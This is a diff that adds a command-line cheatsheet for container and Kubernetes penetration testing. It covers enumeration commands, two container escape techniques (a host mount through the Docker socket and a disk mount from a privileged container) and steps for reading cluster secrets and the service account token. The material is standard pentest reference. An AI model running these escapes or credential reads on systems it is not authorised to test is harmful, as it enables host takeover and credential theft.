@@ -1,0 +1,67 @@
+% docker, kubernetes, containers, escape
+
+# Check if inside container
+ls -la /.dockerenv
+cat /proc/1/cgroup | grep docker
+
+# List docker images
+docker images
+
+# List running containers
+docker ps
+
+# List all containers
+docker ps -a
+
+# Execute into container
+docker exec -it <container_id> /bin/bash
+
+# Inspect container
+docker inspect <container_id>
+
+# Docker socket escape (if socket mounted)
+docker run -v /:/hostfs -it alpine chroot /hostfs
+
+# Privileged container escape - mount host
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+
+# Check capabilities
+capsh --print
+
+# Kubernetes - get pods
+kubectl get pods
+
+# Kubernetes - get all namespaces
+kubectl get namespaces
+
+# Kubernetes - get pods all namespaces
+kubectl get pods --all-namespaces
+
+# Kubernetes - get secrets
+kubectl get secrets
+
+# Kubernetes - decode secret
+kubectl get secret <secret_name> -o yaml
+
+# Kubernetes - exec into pod
+kubectl exec -it <pod_name> -- /bin/bash
+
+# Get service account token
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Check RBAC permissions
+kubectl auth can-i --list
+
+# Trivy - scan image
+trivy image <image_name>
+
+# Deepce - Docker enumeration
+./deepce.sh
+
+# CDK - container pentest toolkit
+./cdk evaluate
+
+$ container_id: docker ps --format "{{.ID}}\t{{.Names}}" 2>/dev/null
+$ pod_name: kubectl get pods --no-headers 2>/dev/null | awk '{print $1}'
+$ secret_name: kubectl get secrets --no-headers 2>/dev/null | awk '{print $1}'
+$ image_name: docker images --format "{{.Repository}}:{{.Tag}}" 2>/dev/null
